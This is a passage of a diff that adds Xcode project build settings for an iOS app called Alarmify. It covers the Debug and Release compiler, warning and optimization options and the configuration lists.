+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		8864936C2F0BBFEE006D2FDC /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				GCC_C_LANGUAGE_STANDARD = gnu17;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
+				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		886493502F0BBFEC006D2FDC /* Build configuration list for PBXProject "Alarmify" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				8864936B2F0BBFEE006D2FDC /* Debug */,
+				8864936C2F0BBFEE006D2FDC /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		886493682F0BBFEE006D2FDC /* Build configuration list for PBXNativeTarget "Alarmify" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				886493692F0BBFEE006D2FDC /* Debug */,
+				8864936A2F0BBFEE006D2FDC /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 8864934D2F0BBFEC006D2FDC /* Project object */;
+}
